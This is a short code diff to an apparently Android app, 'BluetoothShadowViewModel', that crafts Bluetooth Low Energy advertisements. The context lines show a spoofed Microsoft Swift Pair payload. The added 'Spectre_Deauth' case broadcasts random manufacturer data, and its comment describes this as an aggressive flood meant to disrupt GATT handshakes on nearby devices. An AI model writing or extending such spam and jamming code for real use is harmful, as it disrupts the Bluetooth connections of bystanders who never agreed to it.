@@ -287,6 +287,11 @@ class BluetoothShadowViewModel(application: Application) : AndroidViewModel(appl
                 // Microsoft Swift Pair
                 builder.addManufacturerData(0x0006, byteArrayOf(0x03, 0x00, 0x80.toByte()))
             }
+            "Spectre_Deauth" -> {
+                // Aggressive random flood to disrupt GATT handshakes
+                val randomBytes = ByteArray(10) { (0..255).random().toByte() }
+                builder.addManufacturerData(0xFFFF.toInt(), randomBytes)
+            }
         }
         return builder.build()
     }
